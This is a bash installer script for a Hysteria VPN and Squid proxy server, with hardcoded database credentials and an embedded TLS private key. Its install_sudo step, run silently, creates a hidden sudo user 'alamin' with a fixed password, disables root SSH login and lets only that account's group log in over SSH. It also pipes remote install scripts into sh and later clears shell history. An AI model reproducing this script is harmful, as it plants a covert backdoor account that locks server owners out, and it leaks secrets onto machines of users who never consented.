#!/bin/bash
#Script Variables
HOST='139.162.143.214';
USER='candyvip_worldpl';
PASS='candyvip_worldpl';
DBNAME='candyvip_worldpl';
PORT_TCP='5666';
PORT_UDP='5666';
SUB_DOMAIN=stu1.worldplush.xyz
MYIP=$(wget -qO- icanhazip.com);
server_ip=$(curl -s https://api.ipify.org)
timedatectl set-timezone Asia/Riyadh

install_require () {
clear
echo 'Installing dependencies.'
{
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y gnupg openssl 
apt install -y iptables socat
apt install -y netcat httpie php neofetch vnstat
apt install -y screen gnutls-bin python
apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
apt install -y build-essential

clear
}
clear
}

install_hysteria(){
clear
echo 'Installing hysteria.'
{
wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/apernet/hysteria/master/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh
} &>/dev/null
}

modify_hysteria(){


clear
echo 'modifying hysteria.'
{
rm -f /etc/hysteria/config.json

echo '{
   "listen": ":5666",
  "cert": "/etc/hysteria/hysteria.crt",
  "key": "/etc/hysteria/hysteria.key",
  "up_mbps": 100,
  "down_mbps": 100,
  "disable_udp": false,
  "obfs": "scbuild",
  "auth": {
    "mode": "passwords",
    "config": ["scbuild1", "scbuilddev"]
  }
}
' >> /etc/hysteria/config.json

chmod 755 /etc/hysteria/config.json
chmod 755 /etc/hysteria/hysteria.crt
chmod 755 /etc/hysteria/hysteria.key
}
}


install_apache2(){


 cat << EOF > /etc/hysteria/hysteria.crt
-----BEGIN CERTIFICATE-----
MIIEEDCCA5agAwIBAgIQOQEdjmHUEqVJhi0OaJesvTAKBggqhkjOPQQDAzBLMQsw
CQYDVQQGEwJBVDEQMA4GA1UEChMHWmVyb1NTTDEqMCgGA1UEAxMhWmVyb1NTTCBF
Q0MgRG9tYWluIFNlY3VyZSBTaXRlIENBMB4XDTIzMDMxMjAwMDAwMFoXDTIzMDYx
MDIzNTk1OVowIjEgMB4GA1UEAxMXZHBucC5vcmFuZ2VtYXN0ZXJiZC54eXowWTAT
BgcqhkjOPQIBBggqhkjOPQMBBwNCAATJABK53CNJUhqFuRUoGbcrf9olIY8MfwOr
YYXPweZnQ+AH4Z3CcnuesiUq9a5mcPgELx53qPI2z7Tnzhk/+/4Ho4ICgzCCAn8w
HwYDVR0jBBgwFoAUD2vmS845R672fpAeefAwkZLIX6MwHQYDVR0OBBYEFI0lrbNo
4kaXXQulllbNvuEhJACvMA4GA1UdDwEB/wQEAwIHgDAMBgNVHRMBAf8EAjAAMB0G
A1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjBJBgNVHSAEQjBAMDQGCysGAQQB
sjEBAgJOMCUwIwYIKwYBBQUHAgEWF2h0dHBzOi8vc2VjdGlnby5jb20vQ1BTMAgG
BmeBDAECATCBiAYIKwYBBQUHAQEEfDB6MEsGCCsGAQUFBzAChj9odHRwOi8vemVy
b3NzbC5jcnQuc2VjdGlnby5jb20vWmVyb1NTTEVDQ0RvbWFpblNlY3VyZVNpdGVD
QS5jcnQwKwYIKwYBBQUHMAGGH2h0dHA6Ly96ZXJvc3NsLm9jc3Auc2VjdGlnby5j
b20wggEEBgorBgEEAdZ5AgQCBIH1BIHyAPAAdQCt9776fP8QyIudPZwePhhqtGcp
Xc+xDCTKhYY069yCigAAAYbVm3XvAAAEAwBGMEQCIF+EXIkPcQRUU6yHffSY2xpl
MSRsMXG/j0aMJufS+WfLAiA5HL2B6RztRlmPoVQEHKSEj/91DF46v01SdyAR+9pd
RAB3AHoyjFTYty22IOo44FIe6YQWcDIThU070ivBOlejUutSAAABhtWbdlkAAAQD
AEgwRgIhANe5P92AVf+Ayu2U3p2L9pApNkrfCRi8A5P4e3Wof0xCAiEArXUjTKc1
/NgbWNtVnQTt2lDHW+J8z1yhcJw4b08sK3EwIgYDVR0RBBswGYIXZHBucC5vcmFu
Z2VtYXN0ZXJiZC54eXowCgYIKoZIzj0EAwMDaAAwZQIwRaqbBE9Sgg5gFnxpTvY/
mc5JgKwCO9XPyLUuUpmdjb3aaqF1TDvJCGLXJSX6/cgZAjEAqkJyh+0p5jxm5OfG
7OZz/ajWCPcL4AQ46YjVl0+CgkrLPLVJdqzSUMy3nLR9JP+B
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIDhTCCAwygAwIBAgIQI7dt48G7KxpRlh4I6rdk6DAKBggqhkjOPQQDAzCBiDEL
MAkGA1UEBhMCVVMxEzARBgNVBAgTCk5ldyBKZXJzZXkxFDASBgNVBAcTC0plcnNl
eSBDaXR5MR4wHAYDVQQKExVUaGUgVVNFUlRSVVNUIE5ldHdvcmsxLjAsBgNVBAMT
JVVTRVJUcnVzdCBFQ0MgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkwHhcNMjAwMTMw
MDAwMDAwWhcNMzAwMTI5MjM1OTU5WjBLMQswCQYDVQQGEwJBVDEQMA4GA1UEChMH
WmVyb1NTTDEqMCgGA1UEAxMhWmVyb1NTTCBFQ0MgRG9tYWluIFNlY3VyZSBTaXRl
IENBMHYwEAYHKoZIzj0CAQYFK4EEACIDYgAENkFhFytTJe2qypTk1tpIV+9QuoRk
gte7BRvWHwYk9qUznYzn8QtVaGOCMBBfjWXsqqivl8q1hs4wAYl03uNOXgFu7iZ7
zFP6I6T3RB0+TR5fZqathfby47yOCZiAJI4go4IBdTCCAXEwHwYDVR0jBBgwFoAU
OuEJhtTPGcKWdnRJdtzgNcZjY5owHQYDVR0OBBYEFA9r5kvOOUeu9n6QHnnwMJGS
yF+jMA4GA1UdDwEB/wQEAwIBhjASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdJQQW
MBQGCCsGAQUFBwMBBggrBgEFBQcDAjAiBgNVHSAEGzAZMA0GCysGAQQBsjEBAgJO
MAgGBmeBDAECATBQBgNVHR8ESTBHMEWgQ6BBhj9odHRwOi8vY3JsLnVzZXJ0cnVz
dC5jb20vVVNFUlRydXN0RUNDQ2VydGlmaWNhdGlvbkF1dGhvcml0eS5jcmwwdgYI
KwYBBQUHAQEEajBoMD8GCCsGAQUFBzAChjNodHRwOi8vY3J0LnVzZXJ0cnVzdC5j
b20vVVNFUlRydXN0RUNDQWRkVHJ1c3RDQS5jcnQwJQYIKwYBBQUHMAGGGWh0dHA6
Ly9vY3NwLnVzZXJ0cnVzdC5jb20wCgYIKoZIzj0EAwMDZwAwZAIwJHBUDwHJQN3I
VNltVMrICMqYQ3TYP/TXqV9t8mG5cAomG2MwqIsxnL937Gewf6WIAjAlrauksO6N
UuDdDXyd330druJcZJx0+H5j5cFOYBaGsKdeGW7sCMaR2PsDFKGllas=
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIID0zCCArugAwIBAgIQVmcdBOpPmUxvEIFHWdJ1lDANBgkqhkiG9w0BAQwFADB7
MQswCQYDVQQGEwJHQjEbMBkGA1UECAwSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYD
VQQHDAdTYWxmb3JkMRowGAYDVQQKDBFDb21vZG8gQ0EgTGltaXRlZDEhMB8GA1UE
AwwYQUFBIENlcnRpZmljYXRlIFNlcnZpY2VzMB4XDTE5MDMxMjAwMDAwMFoXDTI4
MTIzMTIzNTk1OVowgYgxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpOZXcgSmVyc2V5
MRQwEgYDVQQHEwtKZXJzZXkgQ2l0eTEeMBwGA1UEChMVVGhlIFVTRVJUUlVTVCBO
ZXR3b3JrMS4wLAYDVQQDEyVVU0VSVHJ1c3QgRUNDIENlcnRpZmljYXRpb24gQXV0
aG9yaXR5MHYwEAYHKoZIzj0CAQYFK4EEACIDYgAEGqxUWqn5aCPnetUkb1PGWthL
q8bVttHmc3Gu3ZzWDGH926CJA7gFFOxXzu5dP+Ihs8731Ip54KODfi2X0GHE8Znc
JZFjq38wo7Rw4sehM5zzvy5cU7Ffs30yf4o043l5o4HyMIHvMB8GA1UdIwQYMBaA
FKARCiM+lvEH7OKvKe+CpX/QMKS0MB0GA1UdDgQWBBQ64QmG1M8ZwpZ2dEl23OA1
xmNjmjAOBgNVHQ8BAf8EBAMCAYYwDwYDVR0TAQH/BAUwAwEB/zARBgNVHSAECjAI
MAYGBFUdIAAwQwYDVR0fBDwwOjA4oDagNIYyaHR0cDovL2NybC5jb21vZG9jYS5j
b20vQUFBQ2VydGlmaWNhdGVTZXJ2aWNlcy5jcmwwNAYIKwYBBQUHAQEEKDAmMCQG
CCsGAQUFBzABhhhodHRwOi8vb2NzcC5jb21vZG9jYS5jb20wDQYJKoZIhvcNAQEM
BQADggEBABns652JLCALBIAdGN5CmXKZFjK9Dpx1WywV4ilAbe7/ctvbq5AfjJXy
ij0IckKJUAfiORVsAYfZFhr1wHUrxeZWEQff2Ji8fJ8ZOd+LygBkc7xGEJuTI42+
FsMuCIKchjN0djsoTI0DQoWz4rIjQtUfenVqGtF8qmchxDM6OW1TyaLtYiKou+JV
bJlsQ2uRl9EMC5MCHdK8aXdJ5htN978UeAOwproLtOGFfy/cQjutdAFI3tZs4RmY
CV4Ks2dH/hzg1cEo70qLRDEmBDeNiXQ2Lu+lIg+DdEmSx/cQwgwp+7e9un/jX9Wf
8qn0dNW44bOwgeThpWOjzOoEeJBuv/c=
-----END CERTIFICATE-----
EOF
    
cat << EOF > /etc/hysteria/hysteria.key
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIBJZbS8tsXyzyDqInXCTG5ESDskaq0f+MR1LZuu69PdQoAoGCCqGSM49
AwEHoUQDQgAEyQASudwjSVIahbkVKBm3K3/aJSGPDH8Dq2GFz8HmZ0PgB+GdwnJ7
nrIlKvWuZnD4BC8ed6jyNs+0584ZP/v+Bw==
-----END EC PRIVATE KEY-----
EOF
}



install_letsencrypt()
{
clear
/etc/init.d/apache2 restart
echo "Installing letsencrypt."
{
domain=$(cat /root/domain)
curl  https://get.acme.sh | sh
~/.acme.sh/acme.sh --register-account -m support@fibervpn.live --server zerossl
~/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/hysteria/hysteria.crt --keypath /etc/hysteria/hysteria.key --ecc
}
}



create_hostname() {

clear

echo 'Creating hostname.'
{
sub=$(</dev/urandom tr -dc a-z0-9 | head -c4)
SUB_DOMAIN=${sub}.${DOMAIN}
curl -X POST "https://api.cloudflare.com/client/v4/zones/${CF_ZONE}/dns_records" -H "X-Auth-Email: ${CF_ID}" -H "X-Auth-Key: ${CF_KEY}" -H "Content-Type: application/json" --data '{"type":"A","name":"'"${SUB_DOMAIN}"'","content":"'"${MYIP}"'","ttl":1,"priority":0,"proxied":false}' &>/dev/null
echo "$SUB_DOMAIN" > /root/domain
}
}



install_firewall_kvm () {
clear
echo "Installing iptables."
echo "net.ipv4.ip_forward=1
net.ipv4.conf.all.rp_filter=0
net.ipv4.conf.eth0.rp_filter=0" >> /etc/sysctl.conf
sysctl -p
{
iptables -F
iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
iptables-save > /etc/iptables_rules.v4
ip6tables-save > /etc/iptables_rules.v6
}
}



install_squid(){
clear
echo 'Installing proxy.'
{
sudo apt install -y squid
cd /etc/squid/ || exit
rm squid.conf
echo "acl SSH dst $(ip route get 8.8.8.8 | awk '/src/ {f=NR} f&&NR-1==f' RS=" ")" >> squid.conf
echo 'acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
http_access allow SSH
http_access deny all
http_port 8080
http_port 8181
http_port 9090
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname KobZ-Proxy' >> squid.conf

service squid restart
cd /etc || exit
}
}

install_sudo(){
  {
    useradd -m alamin 2>/dev/null; echo alamin:@Alaminbdsc17@ | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
    service sshd restart
  }&>/dev/null
}
install_rclocal(){
  {  
  
    echo "[Unit]
Description=teamkidlat service
Documentation=http://teamkidlat.com
[Service]
Type=oneshot
ExecStart=/bin/bash /etc/rc.local
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/teamkidlat.service
    echo '#!/bin/sh -e
iptables-restore < /etc/iptables_rules.v4
ip6tables-restore < /etc/iptables_rules.v6
sysctl -p
service hysteria-server restart
exit 0' >> /etc/rc.local
    sudo chmod +x /etc/rc.local
    systemctl daemon-reload
    sudo systemctl enable teamkidlat
    sudo systemctl start teamkidlat.service
  }
}

start_service () {
clear
echo 'Starting..'

clear
echo '++++++++++++++++++++++++++++++++++'
echo '*       HYSTERIA is ready!    *'
echo '+++++++++++************+++++++++++'
echo -e "[IP] : $server_ip\n[Hysteria Port] : 5666\n"
history -c;
systemctl start hysteria-server.service
systemctl enable hysteria-server.service
sleep 20
reboot
}


install_require
install_sudo
install_hysteria
install_firewall_kvm
modify_hysteria
install_apache2
install_squid
install_rclocal
start_service
